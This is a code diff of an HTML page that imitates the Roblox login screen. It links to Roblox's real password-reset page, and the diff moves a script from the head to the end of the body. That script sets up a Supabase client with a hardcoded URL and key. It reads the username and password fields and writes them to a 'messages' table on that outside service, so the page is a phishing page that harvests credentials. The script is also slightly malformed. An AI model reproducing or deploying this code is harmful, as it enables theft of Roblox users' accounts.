@@ -8,21 +8,6 @@
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
     <link rel="stylesheet" href="rstyle.css" >
 </head>
-<script>
-    const SUPABASE_URL = "https://mcaeueqqfhfbvuuilmtl.supabase.co";
-    const SUPABASE_KEY = "sb_publishable_1thr_HyKVuLuzwNbgimN4w_LwalkFmu";
-    
-    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-    
-document.getElementById('send').addEventListener('click', async () => {
-      const username = document.getElementById('user').value;
-      const password = document.getElementById('pass').value;
-}
-supabase.from('messages').insert([
-  { username: username, pass: password }
-]);
-
-</script>
 <body>
     <div class="s">
         <h1>Login to Roblox</h1>
@@ -36,5 +21,21 @@ supabase.from('messages').insert([
 <a href="https://www.roblox.com/login/forgot-password-or-username">
 <label id="f">Forgot password?</label></a>
     </div>
+
+<script>
+    const SUPABASE_URL = "https://mcaeueqqfhfbvuuilmtl.supabase.co";
+    const SUPABASE_KEY = "sb_publishable_1thr_HyKVuLuzwNbgimN4w_LwalkFmu";
+    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+document.getElementById('send').addEventListener('click', async () => {
+      const username = document.getElementById('user').value;
+      const password = document.getElementById('pass').value;
+}
+                                                 
+supabase.from('messages').insert([
+  { username: username, pass: password }
+]);
+</script>
+    
 </body>
 </html>
